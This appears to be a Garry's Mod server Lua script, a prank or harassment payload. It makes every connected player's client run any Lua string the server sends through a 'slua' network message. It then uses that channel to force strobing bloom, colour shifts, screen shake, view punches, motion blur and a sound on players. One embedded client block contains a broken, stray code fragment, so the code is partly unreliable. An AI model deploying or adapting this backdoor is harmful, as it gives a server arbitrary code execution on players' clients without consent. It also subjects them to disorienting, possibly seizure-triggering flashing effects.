
util.AddNetworkString "slua"

local lol = {}
function lol:RandomString( intMin, intMax )
	local ret = ""
	for _ = 1, math.random( intMin, intMax ) do
		ret = ret.. string.char( math.random(65, 90) )
	end

	return ret
end

lol.m_tblActions = {}
lol.m_strImageGlobalVar = lol:RandomString( 6, 12 )
lol.m_strImageLoadHTML = [[<style type="text/css"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and "margin: -8px -8px;" or "margin: 0px 0px;") ..[[ } </style><body><img src="]] .. "%s" .. [[" alt="" width="]] .. "%i"..[[" height="]] .. "%i" .. [[" /></body>]]

function lol:PushAction( intChainDelay, func )
	self.m_tblActions[#self.m_tblActions +1] = { intChainDelay, func }
end

function lol:NextAction( pPlayer )
	pPlayer.m_intCurAction = pPlayer.m_intCurAction +1
	if not self.m_tblActions[pPlayer.m_intCurAction] then return end

	timer.Simple( self.m_tblActions[pPlayer.m_intCurAction][1], function()
		if not IsValid( pPlayer ) then return end
		self.m_tblActions[pPlayer.m_intCurAction][2]( pPlayer )
		self:NextAction( pPlayer )
	end )
end

function lol:Start( pPlayer )
	pPlayer.m_intCurAction = 0
	self:NextAction( pPlayer )
end

function lol:SendLua( pPlayer, strLua )
	net.Start( "slua" )
		net.WriteString( strLua )
	net.Send( pPlayer )
end

function lol:SetupPlayer( pPlayer )
	pPlayer:SendLua( "net.Receive(\"slua\", function() RunString(net.ReadString()) end)" )
end

for k, v in pairs( player.GetAll() ) do
	lol:SetupPlayer( v )
	timer.Simple( 2, function() lol:Start( v ) end )
end

hook.Add( "PlayerAuthed", "wat", function( pPlayer )
	lol:SetupPlayer( pPlayer )
	timer.Simple( 10, function() lol:Start( pPlayer ) end )	
end )

lol:PushAction( 10, function( pPlayer )
	local idx = pPlayer:EntIndex()
	timer.Create( "beat".. idx, 0.42, 0, function()
	    if not IsValid( pPlayer ) then timer.Destroy( "beat".. idx ) return end
	    pPlayer:ViewPunch( Angle(math.Rand(-25, -20), math.Rand(-20, 20), 0) )
	end )


	lol:SendLua( pPlayer, [[
		local emitter = ParticleEmitter( LocalPlayer():GetPos() )
		local time = 0

		hook.Add( "Think", "wat", function()
			if CurTime() < time then
				return
			end

			time = CurTime() +0.05
			for i = 1, 16 do
				local part = emitter:Add(
					"particles/balloon_bit", 
					LocalPlayer():GetPos() +Vector( 
						math.random( -256, 256 ), 
						math.random( -256, 256 ), 
						256
					)
				)
				
				if part then
					local Size = math.random( 4, 7 )
					
					part:SetColor( math.random(0, 255), math.random(0, 255), math.random(0, 255), 255 )
					part:SetVelocity( Vector( 40, 25, -math.random(300, 400) ) )
					part:SetDieTime( 4.5 )
					part:SetGravity( Vector(40, 0, -250) )
					part:SetLifeTime( 0 )
					part:SetStartSize( Size /2 )
					part:SetEndSize( Size )
					part:SetCollide( true )
				end
			end
		end )
	]] )

	lol:SendLua( pPlayer, [[
		hook.Add( "RenderScreenspaceEffects", "wat", function()
			local sinScaler = math.sin( CurTime() )
			DrawBloom(
				0,
				3,
				sinScaler *math.Rand(1, 8),
				sinScaler *math.Rand(1, 8),
				6,
				math.Rand(0.5, 2),
				math.Rand(0, 0.3),
				math.Rand(0, 0.3),
				math.Rand(0.5, 1)
			)

			DrawColorModify{
				["$pp_colour_addr"] = 0,
				["$pp_colour_addg"] = 0,
				["$pp_colour_addb"] = 00,
				["$pp_colour_brightness" ] = 0,
				["$pp_colour_contrast" ] = 1,
				["$pp_colour_colour" ] = 1,
				["$pp_colour_mulr" ] = 0,
				["$pp_colour_mulg" ] = 0,
				["$pp_colour_mulb" ] = 1
			}
		end )

		
			if CurTime() > time then
				time = CurTime() +0.15
			end
		end )

		surface.PlaySound( "vo/npc/male01/ohno.wav" )
	]] )
end )


lol:PushAction( 54, function( pPlayer )
	lol:SendLua( pPlayer, [[
		hook.Add( "GetMotionBlurValues", "wat", function()
			return 0, 0, 1, math.sin(CurTime() *13)
		end )

		hook.Add( "RenderScreenspaceEffects", "ohgod", function()
			local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) )
			DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) )
			DrawMaterialOverlay( "effects/tp_eyefx/tpeye", 1 )
		end )

		hook.Add( "PostDrawTranslucentRenderables", "ohgod", function()
			render.SetMaterial( Material("cable/blue_elec") )
			for i = 1, 32 do
				render.DrawBeam( LocalPlayer():GetPos() +Vector(0, 0, 128) +(EyeAngles():Forward() *256), EyePos() +(VectorRand() *256), 4, 0, 12.5, Color(255, 255, 255, 255) )
			end
		end )

		timer.Create( "thedrop", 0.53, 0, function()
			util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) 
		end )
	]] )
end )

